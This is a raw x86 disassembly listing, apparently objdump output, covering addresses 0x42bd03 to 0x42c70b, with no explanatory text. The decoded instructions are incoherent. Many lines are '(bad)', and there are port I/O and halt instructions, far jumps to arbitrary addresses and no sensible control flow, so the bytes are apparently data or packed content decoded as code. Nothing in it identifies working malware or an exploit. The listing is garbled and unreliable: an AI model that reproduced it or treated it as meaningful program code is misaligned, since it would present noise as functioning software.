  42bd03:	jmp    FWORD PTR [eax+0x45]
  42bd06:	fucomp st(5)
  42bd08:	nop
  42bd09:	mov    WORD PTR [ecx+ebp*8+0x2e],es
  42bd0d:	jb     0x42bcf2
  42bd0f:	xor    al,BYTE PTR [eax]
	...
  42bd71:	add    BYTE PTR [eax],al
  42bd73:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bd6c
  42bd81:	jbe    0x42bd31
  42bd83:	aam    0xd8
  42bd85:	aam    0x1
  42bd87:	add    BYTE PTR [ecx+eax*1],al
  42bd8a:	add    BYTE PTR [eax],al
  42bd8c:	mov    DWORD PTR [ecx-0x15f78ae3],esp
  42bd92:	xor    eax,0x25f88fa7
  42bd97:	push   ds
  42bd98:	xlat   BYTE PTR ds:[ebx]
  42bd99:	enter  0x7243,0xf2
  42bd9d:	out    0x2d,al
  42bd9f:	jp     0x42bd40
  42bda1:	inc    esp
  42bda2:	scas   eax,DWORD PTR es:[edi]
  42bda3:	cli    
  42bda4:	neg    DWORD PTR [eax-0xe]
  42bda7:	fnsave [edi+0x354e2b01]
  42bdad:	mov    ah,0xf2
  42bdaf:	fcomi  st,st(7)
  42bdb1:	cli    
  42bdb2:	stos   DWORD PTR es:[edi],eax
  42bdb3:	lds    esi,FWORD PTR [eax-0x42d706c7]
  42bdb9:	pop    eax
  42bdba:	outs   dx,BYTE PTR ds:[esi]
  42bdbc:	jmp    0x333bc8e2
  42bdc1:	hlt    
  42bdc2:	fwait
  42bdc3:	ins    BYTE PTR es:[edi],dx
  42bdc4:	pop    ebp
  42bdc5:	jmp    0xeaced812
  42bdca:	mov    cs,WORD PTR [edi-0x45]
  42bdcd:	push   ss
  42bdce:	mov    esp,0xea610539
  42bdd3:	shl    BYTE PTR [eax-0x6ab51d4e],0x8
  42bdda:	imul   ebx,DWORD PTR [ecx+ecx*4],0xfffffff8
  42bdde:	add    ecx,DWORD PTR [edi-0x68]
  42bde1:	xchg   ecx,eax
  42bde2:	pop    ebp
  42bde3:	test   BYTE PTR [eax+ebx*2-0x2d8daacc],dh
  42bdea:	jge    0x42bd9f
  42bdec:	inc    eax
  42bded:	inc    eax
  42bdee:	inc    esp
  42bdef:	into   
  42bdf0:	xor    BYTE PTR [ecx+0x23365fd1],ah
  42bdf6:	cmp    al,0x62
  42bdf8:	repnz ins BYTE PTR es:[edi],dx
  42bdfa:	jmp    0xf5783254
  42bdff:	in     eax,0x41
  42be01:	sbb    dh,BYTE PTR [ebp-0x38]
  42be04:	clc    
  42be05:	xchg   edi,eax
  42be06:	loope  0x42bdef
  42be08:	out    0xa8,eax
  42be0a:	inc    ebx
  42be0b:	sbb    DWORD PTR [eax],edx
  42be0d:	mov    eax,ds:0x602bbed
  42be12:	adc    eax,ebx
  42be14:	mov    eax,0x8be4d3c0
  42be19:	(bad)  
  42be1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be1b:	xor    al,BYTE PTR [ecx]
  42be1d:	inc    ebp
  42be1e:	mov    al,ds:0x145f808b
  42be23:	int    0xe
  42be25:	cld    
  42be26:	pop    esi
  42be27:	mov    ecx,edi
  42be29:	mov    ds:0xed51e973,eax
  42be2e:	mov    bh,0x19
  42be30:	outs   dx,BYTE PTR ds:[esi]
  42be31:	adc    BYTE PTR [eax],cl
  42be33:	sbb    esp,ebp
  42be35:	aam    0xcb
  42be37:	(bad)  
  42be38:	dec    DWORD PTR [ebp+0x4dc0ed2a]
  42be3e:	ja     0x42be30
  42be40:	and    eax,0x1eb223ba
  42be45:	cdq    
  42be46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be47:	push   esp
  42be48:	in     eax,0x70
  42be4a:	ins    BYTE PTR es:[edi],dx
  42be4b:	pop    ecx
  42be4c:	les    esi,FWORD PTR [ecx-0x3012948]
  42be52:	mov    esi,0xbf38874
  42be57:	xchg   esp,eax
  42be58:	add    eax,0x1e8c15d9
  42be5d:	jecxz  0x42be61
  42be5f:	outs   dx,BYTE PTR ds:[esi]
  42be60:	jae    0x42bede
  42be62:	mov    bl,0xcc
  42be64:	imul   eax,DWORD PTR [ecx+0x1a2cad0e],0xa4286c26
  42be6e:	push   edi
  42be6f:	ja     0x42beda
  42be71:	aam    0x5c
  42be73:	jle    0x42be71
  42be75:	inc    edx
  42be76:	sbb    eax,0xf4eff2bc
  42be7b:	dec    esi
  42be7c:	push   esi
  42be7d:	push   ds
  42be7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be7f:	xor    DWORD PTR ds:0xec37f704,0x1d
  42be86:	setl   BYTE PTR [ebx]
  42be89:	mul    DWORD PTR [edi+0x58]
  42be8c:	jnp    0x42be1a
  42be8e:	mov    edx,0x9b
	...
  42bef3:	add    BYTE PTR [edi-0x825b8e0],dl
  42bef9:	call   FWORD PTR [edi-0x28375c93]
  42beff:	jnp    0x42bf3d
  42bf01:	jmp    0x1:0xd5dc6225
  42bf08:	add    al,0x1
  42bf0a:	add    BYTE PTR [eax],al
  42bf0c:	and    bl,al
  42bf0e:	jmp    DWORD PTR [eax+0x718fce11]
  42bf14:	push   es
  42bf15:	xor    eax,DWORD PTR [esp+ecx*2+0x74defb86]
  42bf1c:	sbb    ecx,eax
  42bf1e:	mov    ebp,ebx
  42bf20:	adc    DWORD PTR [ebp+0x43],ebp
  42bf23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bf24:	adc    al,0x85
  42bf26:	or     DWORD PTR [ebp-0x3a],edi
  42bf29:	and    eax,DWORD PTR [edx+0x5e]
  42bf2c:	sub    ebp,DWORD PTR [esi+eax*1-0xc4a0542]
  42bf33:	stc    
  42bf34:	sbb    eax,0xbc16ab00
  42bf39:	fistp  WORD PTR [edx]
  42bf3b:	adc    al,0xa2
  42bf3d:	ja     0x42bece
  42bf3f:	hlt    
  42bf40:	lods   eax,DWORD PTR ds:[esi]
  42bf41:	sbb    eax,0x4684596e
  42bf46:	std    
  42bf47:	push   eax
  42bf48:	shl    DWORD PTR [ebp+0x22],1
  42bf4b:	nop
  42bf4c:	push   cs
  42bf4d:	mul    ecx
  42bf4f:	add    al,0x18
  42bf51:	cmp    eax,0x9a8b4e83
  42bf56:	xchg   BYTE PTR [ebx+0x7c43f8c1],dl
  42bf5c:	inc    edi
  42bf5d:	sar    eax,1
  42bf5f:	pop    esi
  42bf61:	cmp    edx,DWORD PTR [ebp+0x13]
  42bf64:	fnstcw WORD PTR [ebx]
  42bf66:	(bad)  
  42bf67:	cli    
  42bf68:	(bad)  
  42bf69:	cmc    
  42bf6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf6b:	dec    edi
  42bf6c:	inc    edi
  42bf6d:	mov    ch,0x0
  42bf6f:	dec    esp
  42bf70:	mov    ds:0xb1d52791,al
  42bf75:	das    
  42bf76:	int    0x3f
  42bf78:	push   0xf98f371b
  42bf7d:	jae    0x42bf05
  42bf7f:	jmp    0xd9a9ae7c
  42bf84:	dec    ebp
  42bf85:	lds    esp,FWORD PTR [ebx]
  42bf87:	and    ebp,esp
  42bf89:	arpl   WORD PTR [ebx-0x7c464f0d],ax
  42bf8f:	push   ds
  42bf90:	adc    edx,ebp
  42bf92:	test   DWORD PTR [edx-0xc],esp
  42bf95:	sub    eax,0xbf31f51
  42bf9a:	adc    al,0xab
  42bf9c:	fmul   DWORD PTR [ebp-0x67a71a36]
  42bfa2:	xor    ecx,ebx
  42bfa4:	imul   esi,edi,0x76f5fbc0
  42bfaa:	iret   
  42bfab:	sub    edi,DWORD PTR [edx]
  42bfad:	push   ds
  42bfae:	(bad)  
  42bfaf:	call   0x44494d92
  42bfb4:	cld    
  42bfb5:	lock popa 
  42bfb7:	in     eax,dx
  42bfb8:	test   BYTE PTR [esi],0xad
  42bfbb:	(bad)  
  42bfbc:	aam    0x47
  42bfbe:	call   ebp
  42bfc0:	outs   dx,BYTE PTR ds:[esi]
  42bfc1:	jge    0x42c028
  42bfc3:	xchg   esi,eax
  42bfc4:	pop    edx
  42bfc5:	out    dx,al
  42bfc6:	sub    esi,eax
  42bfc8:	xor    DWORD PTR [eax+0x4a],edi
  42bfcb:	mov    ss,WORD PTR [edx+0xc40f35d]
  42bfd1:	popf   
  42bfd2:	test   eax,0x49b6f027
  42bfd7:	stos   DWORD PTR es:[edi],eax
  42bfd8:	sbb    bh,BYTE PTR ds:0x1b4c4a02
  42bfde:	outs   dx,BYTE PTR ds:[esi]
  42bfdf:	xchg   ecx,eax
  42bfe0:	out    0x1,al
  42bfe2:	mov    WORD PTR [esi*8+0x4c1cba5d],?
  42bfe9:	or     BYTE PTR [edx],0x26
  42bfec:	stc    
  42bfed:	cmp    bh,BYTE PTR [eax]
  42bfef:	ss or  eax,0x76f61a88
  42bff5:	inc    ecx
  42bff6:	mov    al,0x7f
  42bff8:	ss jp  0x42c048
  42bffb:	xchg   ebx,eax
  42bffc:	(bad)  
  42bffe:	and    edi,DWORD PTR [edx+0x23]
  42c001:	dec    ebp
  42c002:	(bad)  
  42c003:	iret   
  42c004:	dec    edi
  42c005:	push   cs
  42c006:	jae    0x42bf9e
  42c008:	sahf   
  42c009:	fnstenv [ecx+eiz*2]
  42c00c:	test   al,0x8e
  42c00e:	sbb    eax,0xa4
	...
  42c073:	add    BYTE PTR [edx],bh
  42c075:	xchg   edx,eax
  42c076:	ja     0x42c0aa
  42c078:	push   edi
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	or     ah,0x9c
  42c083:	push   esp
  42c084:	loopne 0x42c05c
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    al,0x1
  42c08a:	add    BYTE PTR [eax],al
  42c08c:	loope  0x42c0d1
  42c08e:	push   esi
  42c08f:	xor    ebp,eax
  42c091:	addr16 or eax,0xd887fccd
  42c097:	sahf   
  42c098:	(bad)  
  42c099:	fld    TBYTE PTR [eax+esi*8+0x49a34399]
  42c0a0:	mov    bh,0x95
  42c0a2:	dec    esi
  42c0a3:	add    esp,DWORD PTR [ecx]
  42c0a5:	outs   dx,BYTE PTR ds:[esi]
  42c0a6:	pop    esp
  42c0a7:	mov    ds:0xcd0661a9,eax
  42c0ac:	mov    ch,0x2f
  42c0ae:	push   ss
  42c0af:	push   esi
  42c0b0:	and    ch,dl
  42c0b2:	test   DWORD PTR [ebp-0x6a7f81b2],esi
  42c0b8:	cwde   
  42c0b9:	(bad)  
  42c0ba:	cmc    
  42c0bb:	xor    BYTE PTR [ecx],cl
  42c0bd:	sub    DWORD PTR ds:0x686a480a,0xffffffa2
  42c0c4:	pop    es
  42c0c5:	xchg   ebp,eax
  42c0c6:	sbb    al,0x9c
  42c0c8:	mov    esp,0xac2b696f
  42c0cd:	lods   eax,DWORD PTR ds:[esi]
  42c0ce:	jbe    0x42c140
  42c0d0:	popf   
  42c0d1:	fwait
  42c0d2:	nop
  42c0d3:	sbb    ch,ch
  42c0d5:	popa   
  42c0d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c0d7:	pusha  
  42c0d8:	fcom   DWORD PTR [ebx-0x76]
  42c0db:	(bad)  
  42c0dd:	sub    eax,0x92de6dec
  42c0e2:	jge    0x42c0d7
  42c0e4:	dec    ecx
  42c0e5:	(bad)  
  42c0e7:	js     0x42c0b7
  42c0e9:	lods   eax,DWORD PTR ds:[esi]
  42c0ea:	es pop ebx
  42c0ec:	(bad)  [ebx+0x2e]
  42c0ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c0f0:	mov    edx,esp
  42c0f2:	test   BYTE PTR [ebx],0xff
  42c0f5:	push   edi
  42c0f6:	nop
  42c0f7:	ins    DWORD PTR es:[edi],dx
  42c0f8:	xchg   esp,eax
  42c0f9:	data16 outs dx,BYTE PTR ds:[esi]
  42c0fb:	call   0x3ca3:0x236e87de
  42c102:	test   al,0x8e
  42c104:	xlat   BYTE PTR ds:[ebx]
  42c105:	retf   
  42c106:	dec    ecx
  42c107:	popf   
  42c108:	hlt    
  42c109:	push   cs
  42c10a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c10b:	imul   eax,DWORD PTR [ebx-0x493fb591],0x16
  42c112:	das    
  42c113:	ret    
  42c114:	mov    DWORD PTR [ebp+0x1a],esi
  42c117:	in     al,dx
  42c118:	sahf   
  42c119:	into   
  42c11a:	adc    al,0x55
  42c11c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c11d:	shl    esp,cl
  42c11f:	fidiv  WORD PTR cs:[ebp+0x12]
  42c123:	mov    ds:0x37af269c,al
  42c128:	stos   BYTE PTR es:[edi],al
  42c129:	mov    ds:0xc0da3878,eax
  42c12e:	mov    dl,0xa5
  42c130:	out    0xa9,al
  42c132:	ret    
  42c133:	pop    ecx
  42c134:	jnp    0x42c1a9
  42c136:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c137:	inc    edx
  42c138:	push   esp
  42c139:	mov    ds:0xa9572a97,al
  42c13e:	inc    edx
  42c13f:	test   DWORD PTR [ebx],esi
  42c141:	dec    eax
  42c142:	jge    0x42c185
  42c144:	cmp    DWORD PTR [eax],ebp
  42c146:	iret   
  42c147:	cdq    
  42c148:	jp     0x42c108
  42c14a:	mov    ds,esp
  42c14c:	cmp    DWORD PTR [edi],0xbe538820
  42c152:	cmp    dh,dh
  42c154:	jl     0x42c133
  42c156:	fadd   DWORD PTR [edx]
  42c158:	jbe    0x42c142
  42c15a:	and    esi,DWORD PTR [edx]
  42c15c:	int    0xe8
  42c15e:	mov    edi,0x57f8f7ca
  42c163:	or     eax,0xfc93d79d
  42c168:	jns    0x42c149
  42c16a:	enter  0xcfc6,0x4c
  42c16e:	mov    ss,WORD PTR [esi-0x32]
  42c171:	or     DWORD PTR [edi-0x9],0xffffff8c
  42c175:	push   edi
  42c176:	xor    ebx,DWORD PTR [edi]
  42c178:	inc    ecx
  42c179:	inc    ecx
  42c17a:	cs inc ebp
  42c17c:	clc    
  42c17d:	sbb    WORD PTR [edi],0x68
  42c181:	loope  0x42c1a1
  42c183:	sub    DWORD PTR [edi+ebx*8+0x59cbe720],edx
  42c18a:	loopne 0x42c13c
  42c18c:	imul   ecx,DWORD PTR [eax+0xe71c],0x0
	...
  42c1f3:	add    BYTE PTR [ecx-0x7e],ch
  42c1f6:	int    0xae
  42c1f8:	out    dx,eax
  42c1f9:	out    dx,eax
  42c1fa:	imul   eax,edi,0xfffffff2
  42c1fd:	nop
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	add    dh,ah
  42c202:	push   eax
  42c203:	xor    ah,ah
  42c205:	xlat   BYTE PTR ds:[ebx]
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    al,0x1
  42c20a:	add    BYTE PTR [eax],al
  42c20c:	xor    ebp,DWORD PTR [edi]
  42c20e:	dec    ecx
  42c20f:	int3   
  42c210:	push   ds
  42c211:	call   0xa051fe4b
  42c216:	jmp    0x42c1bc
  42c218:	add    DWORD PTR [eax-0x72aae54e],ebx
  42c21e:	leave  
  42c21f:	in     al,dx
  42c220:	xchg   DWORD PTR [edi-0x356cfc73],esp
  42c226:	sti    
  42c227:	jp     0x42c1b0
  42c229:	jns    0x42c201
  42c22b:	jno    0x42c225
  42c22d:	int    0x36
  42c22f:	mov    ch,0xe4
  42c231:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c232:	inc    eax
  42c233:	xchg   BYTE PTR [edi+0x2a5ec7cd],ch
  42c239:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c23a:	xchg   ebp,eax
  42c23b:	push   ebx
  42c23c:	inc    eax
  42c23d:	in     eax,0x3f
  42c23f:	mov    edx,0x5f82d1a7
  42c244:	mov    eax,ebp
  42c246:	std    
  42c247:	jmp    0xe22b:0x56aa02ee
  42c24e:	pushf  
  42c24f:	outs   dx,BYTE PTR ds:[esi]
  42c250:	clc    
  42c251:	test   dl,bl
  42c253:	push   esp
  42c254:	ret    0x4a07
  42c257:	gs or  eax,0xdb8f78ad
  42c25d:	pop    esp
  42c25e:	jmp    0x42c281
  42c260:	sub    BYTE PTR [edi+0x5a53286],0x17
  42c267:	xor    al,0xe3
  42c269:	int3   
  42c26a:	and    bl,BYTE PTR [edi]
  42c26c:	es loop 0x42c22e
  42c26f:	das    
  42c270:	dec    esp
  42c271:	cmp    esi,ebp
  42c273:	mov    dl,0x8e
  42c276:	std    
  42c277:	test   al,0x6c
  42c279:	push   cs
  42c27a:	push   ss
  42c27b:	push   ebx
  42c27c:	ins    BYTE PTR es:[edi],dx
  42c27d:	out    0xc0,al
  42c27f:	das    
  42c280:	and    BYTE PTR [eax+0x56],ch
  42c283:	cmp    eax,0x8b0628c1
  42c288:	add    eax,0x6a48bd5b
  42c28d:	dec    eax
  42c28e:	addr16 test al,0x27
  42c291:	into   
  42c292:	jno    0x42c27e
  42c294:	dec    ecx
  42c295:	shl    BYTE PTR ds:[eax],1
  42c298:	ret    
  42c299:	pop    es
  42c29a:	bound  ecx,QWORD PTR [edx+0x6b]
  42c29d:	loop   0x42c300
  42c29f:	xor    DWORD PTR [eax+0x4031f306],ebp
  42c2a5:	dec    eax
  42c2a6:	inc    edx
  42c2a7:	sbb    edi,DWORD PTR [ebp+0x7b1a4604]
  42c2ad:	cmp    DWORD PTR [eax-0x14a1f29b],edi
  42c2b3:	test   ecx,ecx
  42c2b5:	cwde   
  42c2b6:	es enter 0xe21c,0xa9
  42c2bb:	add    dl,BYTE PTR [bp+di+0x2e]
  42c2bf:	fnstsw WORD PTR [ecx]
  42c2c1:	repz adc eax,0x56e5cb39
  42c2c7:	push   edi
  42c2c8:	cmp    BYTE PTR [eax],dl
  42c2ca:	or     BYTE PTR [ecx+eax*4],al
  42c2cd:	stos   BYTE PTR es:[edi],al
  42c2ce:	out    dx,eax
  42c2cf:	dec    ebx
  42c2d0:	mov    eax,DWORD PTR [ebp-0x8]
  42c2d3:	sub    BYTE PTR [esi+0x34],dh
  42c2d6:	xor    DWORD PTR [eax],ebx
  42c2d8:	xchg   esi,eax
  42c2d9:	rcl    DWORD PTR [edx+0x5eb09d9],cl
  42c2df:	call   0xe77e:0x56df784
  42c2e6:	xor    DWORD PTR [ebx+0x2d],ebp
  42c2e9:	popf   
  42c2ea:	or     al,0x19
  42c2ec:	inc    edi
  42c2ed:	adc    ebp,DWORD PTR [ebx+0x12]
  42c2f0:	jb     0x42c2af
  42c2f2:	clc    
  42c2f3:	jg     0x42c2b3
  42c2f5:	mov    bl,BYTE PTR [edx+0x42]
  42c2f8:	sub    BYTE PTR [eax-0x24],dl
  42c2fb:	rcl    DWORD PTR [ecx+0x68],1
  42c2fe:	test   esi,eax
  42c300:	dec    eax
  42c301:	shr    DWORD PTR ds:0xb574a99f,1
  42c307:	pop    esi
  42c308:	pushf  
  42c309:	pushf  
  42c30a:	sub    edx,DWORD PTR [ebp+0x4fde760d]
	...
  42c374:	out    0xf,al
  42c376:	fldcw  WORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0x1cddb0f6
  42c383:	dec    esi
  42c384:	call   0x442c561
  42c389:	add    DWORD PTR [eax],eax
  42c38b:	add    BYTE PTR [ecx+edi*1],dh
  42c38e:	mov    di,0xaa63
  42c392:	mov    eax,ds:0x6483ccef
  42c397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c398:	(bad)  
  42c399:	push   esp
  42c39a:	or     al,0x53
  42c39c:	and    ch,BYTE PTR [esi+0x1cd3114d]
  42c3a2:	rol    DWORD PTR [ebp-0x25],cl
  42c3a5:	ret    0xb3a5
  42c3a8:	adc    ch,bl
  42c3aa:	mov    esp,0xd9db657
  42c3af:	push   ecx
  42c3b1:	iret   
  42c3b2:	sub    DWORD PTR [eax+0x64],0xb8f2874e
  42c3b9:	js     0x42c35d
  42c3bb:	int3   
  42c3bc:	push   0x72
  42c3be:	fmul   DWORD PTR [ebp-0x73917a85]
  42c3c4:	bnd jmp 0x9439d9da
  42c3ca:	sar    cl,0x70
  42c3cd:	mov    DWORD PTR [ebx+0x3a64e9ad],0x291d8cc
  42c3d7:	ror    BYTE PTR [esi+ecx*1+0x70],0xcd
  42c3dc:	lods   al,BYTE PTR ds:[esi]
  42c3dd:	jmp    0x42c374
  42c3df:	dec    esp
  42c3e0:	call   0x9213:0xaf9c6cce
  42c3e7:	push   ds
  42c3e8:	inc    esp
  42c3e9:	cs stos DWORD PTR es:[edi],eax
  42c3eb:	push   eax
  42c3ec:	and    ch,0x9a
  42c3ef:	and    bl,BYTE PTR [ebx]
  42c3f1:	xor    bl,dh
  42c3f3:	pop    esp
  42c3f4:	nop
  42c3f5:	mov    dh,0x97
  42c3f7:	dec    edx
  42c3f8:	mov    ebx,0xeed41ea7
  42c3fd:	mov    ds:0xa4bb9b0e,eax
  42c402:	dec    BYTE PTR [edx-0x7]
  42c405:	xor    BYTE PTR [ebp+eiz*4-0x401ced06],0xc3
  42c40d:	mov    ebx,ebx
  42c40f:	leave  
  42c410:	lods   eax,DWORD PTR ds:[esi]
  42c411:	push   esp
  42c412:	repnz pop eax
  42c414:	rcr    DWORD PTR [edx+eiz*1],1
  42c417:	xor    BYTE PTR [edx],bh
  42c419:	test   al,0x19
  42c41b:	aas    
  42c41c:	in     eax,0x2f
  42c41e:	cmp    eax,0xc5aa70c4
  42c423:	cld    
  42c424:	jmp    0x2b6e:0xb95487a5
  42c42b:	sbb    al,0xc6
  42c42d:	retf   
  42c42e:	pop    es
  42c42f:	adc    ebp,edi
  42c431:	mov    dl,ah
  42c433:	or     edx,esi
  42c435:	retf   
  42c436:	and    ebp,DWORD PTR [eax+0x20]
  42c439:	loop   0x42c3cf
  42c43b:	je     0x42c3cf
  42c43d:	mov    ebp,0x208194e
  42c442:	ins    BYTE PTR es:[edi],dx
  42c443:	mov    WORD PTR [ebx],?
  42c445:	(bad)  
  42c446:	retf   
  42c447:	nop
  42c448:	xor    DWORD PTR [eax-0x2e28d1b],ebp
  42c44e:	add    ch,ah
  42c450:	lds    edi,FWORD PTR [ecx]
  42c452:	xchg   esp,eax
  42c453:	js     0x42c3d5
  42c455:	jmp    0x42c4b9
  42c457:	sti    
  42c458:	or     eax,0x42e6a7d2
  42c45d:	loop   0x42c447
  42c45f:	jb     0x42c4b2
  42c461:	pop    ecx
  42c462:	sbb    DWORD PTR [ebp-0x2615466f],0x6c38456
  42c46c:	pop    ds
  42c46d:	mov    cl,0x4b
  42c46f:	lea    edx,[esi+0x12]
  42c472:	inc    ecx
  42c473:	ficomp DWORD PTR [esi+0x20849728]
  42c479:	mov    ebx,0x6bcc3fd3
  42c47e:	sub    eax,0x51a3832c
  42c483:	xor    eax,0xf1f1d3d1
  42c488:	stos   BYTE PTR es:[edi],al
  42c489:	jno    0x42c4bf
  42c48b:	push   esi
  42c48c:	or     dl,bl
  42c48e:	jno    0x42c427
	...
  42c4f4:	in     al,dx
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0x8234,0xfb
  42c502:	sub    al,0x2f
  42c504:	in     al,dx
  42c505:	fld    DWORD PTR [ecx]
  42c507:	add    BYTE PTR [ecx+eax*1],al
  42c50a:	add    BYTE PTR [eax],al
  42c50c:	mov    ebx,0xb95f4a5b
  42c511:	and    ch,0xb8
  42c514:	ins    BYTE PTR es:[edi],dx
  42c515:	dec    esi
  42c516:	repnz mov ds:0x5352d4d9,eax
  42c51c:	in     eax,0x7
  42c51e:	push   eax
  42c51f:	pop    esi
  42c520:	cwde   
  42c521:	jns    0x42c4fd
  42c523:	pop    edi
  42c524:	int    0xf4
  42c526:	shl    BYTE PTR [ecx+edi*1-0x32b58d6c],1
  42c52d:	enter  0x52f0,0x8
  42c531:	shr    BYTE PTR [esi+0x7],0x46
  42c535:	inc    esp
  42c536:	les    edi,FWORD PTR [edi]
  42c538:	retf   0xd0b3
  42c53b:	stos   BYTE PTR es:[edi],al
  42c53c:	rol    BYTE PTR [ebp+edx*1-0x3128fca9],cl
  42c543:	add    DWORD PTR [edx],esp
  42c545:	push   edi
  42c546:	(bad)  
  42c547:	out    0x6,al
  42c549:	outs   dx,DWORD PTR gs:[esi]
  42c54b:	adc    bh,BYTE PTR [edx]
  42c54d:	hlt    
  42c54e:	out    dx,al
  42c54f:	iret   
  42c550:	push   esp
  42c551:	push   0x6b
  42c553:	mov    ds,WORD PTR [eax-0x69]
  42c556:	jecxz  0x42c4e9
  42c558:	enter  0xf779,0x5f
  42c55c:	mov    ecx,0xe5962d1
  42c561:	jne    0x42c545
  42c563:	hlt    
  42c564:	shr    DWORD PTR [ebx],1
  42c566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c567:	ds int3 
  42c569:	sub    eax,0x637cf688
  42c56e:	and    BYTE PTR [ebx-0x54d10068],al
  42c574:	stos   DWORD PTR es:[edi],eax
  42c575:	sub    al,0x78
  42c577:	pop    es
  42c578:	enter  0x31dc,0x1
  42c57c:	test   al,0x51
  42c57e:	adc    bl,BYTE PTR [ebx*4-0x51043766]
  42c585:	test   al,0x92
  42c587:	inc    BYTE PTR [ecx]
  42c589:	xor    ebp,eax
  42c58b:	test   DWORD PTR [eax-0x2f7b4916],eax
  42c591:	cmp    al,0x68
  42c593:	ins    BYTE PTR es:[edi],dx
  42c594:	xchg   ebx,eax
  42c595:	add    eax,0xca742ee0
  42c59a:	popa   
  42c59b:	adc    eax,0x4f520c2b
  42c5a0:	jge    0x42c55d
  42c5a2:	ror    DWORD PTR [ebp+0x22],cl
  42c5a5:	mov    esi,DWORD PTR [esi-0x18778c21]
  42c5ab:	retf   0x3b94
  42c5ae:	hlt    
  42c5af:	pop    ebx
  42c5b0:	sub    BYTE PTR ds:0xb099fd45,dl
  42c5b6:	sub    al,0x5b
  42c5b8:	mov    ecx,0x2160020a
  42c5bd:	leave  
  42c5be:	cwde   
  42c5bf:	in     al,0xa5
  42c5c1:	fcmovnb st,st(6)
  42c5c3:	pop    ds
  42c5c4:	adc    BYTE PTR [ecx+0x79],dl
  42c5c7:	fadd   QWORD PTR [edx+0x1b]
  42c5ca:	call   0xc13:0x1d656cae
  42c5d1:	xor    DWORD PTR [edi+0x4c5e02c4],0x43
  42c5d8:	mov    esp,es
  42c5da:	fucom  st(7)
  42c5dc:	add    ah,BYTE PTR [esp+ebp*1-0x26]
  42c5e0:	cs adc eax,0xee9efc91
  42c5e6:	jno    0x42c62f
  42c5e8:	jge    0x42c5f8
  42c5ea:	fist   WORD PTR [eax-0x4b96b17f]
  42c5f0:	ins    BYTE PTR es:[edi],dx
  42c5f1:	repnz sbb ecx,0xc7e92932
  42c5f8:	aam    0x15
  42c5fa:	jg     0x42c617
  42c5fc:	leave  
  42c5fd:	sar    BYTE PTR [edi+0x7a],cl
  42c600:	repz xor DWORD PTR [esi],ecx
  42c603:	sar    BYTE PTR [esi+0x5a816e47],cl
  42c609:	xchg   esp,eax
  42c60a:	mov    BYTE PTR [edi],bl
  42c60c:	pop    edx
  42c60d:	gs popf 
  42c60f:	lods   eax,DWORD PTR ds:[esi]
	...
  42c674:	pop    ebp
  42c675:	dec    eax
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx+0x546dfc6b]
  42c681:	(bad)  
  42c682:	cld    
  42c683:	fcomip st,st(0)
  42c685:	fiadd  DWORD PTR [ecx]
  42c687:	add    BYTE PTR [ecx+eax*1],al
  42c68a:	add    BYTE PTR [eax],al
  42c68c:	add    DWORD PTR [edx],edi
  42c68e:	imul   ecx,DWORD PTR [ecx],0x99cee33b
  42c694:	mov    dl,0xfd
  42c696:	aam    0x12
  42c698:	gs (bad) 
  42c69a:	sub    eax,0xf86bfb42
  42c69f:	pop    eax
  42c6a0:	sbb    al,dl
  42c6a2:	mov    dh,0xb9
  42c6a4:	fwait
  42c6a5:	push   0x46783020
  42c6aa:	ja     0x42c70c
  42c6ac:	cmp    DWORD PTR [eax],ebp
  42c6ae:	inc    ecx
  42c6af:	js     0x42c6ea
  42c6b1:	xor    DWORD PTR [ebp+ecx*4-0x1d],0x1a2bd31b
  42c6b9:	xor    bl,BYTE PTR [ebx]
  42c6bb:	adc    al,0x75
  42c6bd:	aad    0xae
  42c6bf:	inc    esi
  42c6c0:	out    dx,eax
  42c6c1:	jns    0x42c669
  42c6c3:	inc    edx
  42c6c4:	sbb    eax,0xeaf0726
  42c6c9:	mov    ss,WORD PTR [esi-0xc]
  42c6cc:	pop    eax
  42c6cd:	test   eax,0xfbd68669
  42c6d2:	nop
  42c6d3:	sub    eax,0x49d68cc
  42c6d8:	ds (bad) 
  42c6da:	cld    
  42c6db:	jl     0x42c6f7
  42c6dd:	sub    edx,esp
  42c6df:	dec    ebx
  42c6e0:	mov    DWORD PTR ds:0x1b8f8538,edx
  42c6e6:	cmp    eax,0xbb1c04c7
  42c6eb:	fimul  DWORD PTR [edx-0x37]
  42c6ee:	jne    0x42c748
  42c6f0:	jae    0x42c725
  42c6f2:	add    bh,BYTE PTR [esi-0x56]
  42c6f5:	dec    ebp
  42c6f6:	mov    ds:0x5aa839d2,al
  42c6fb:	js     0x42c6e0
  42c6fd:	cmp    DWORD PTR [ebx-0x6344b188],0xffffffc1
  42c704:	lahf   
  42c705:	mov    eax,0xcd9d4e57
  42c70a:	pop    esp
  42c70b:	inc    esp
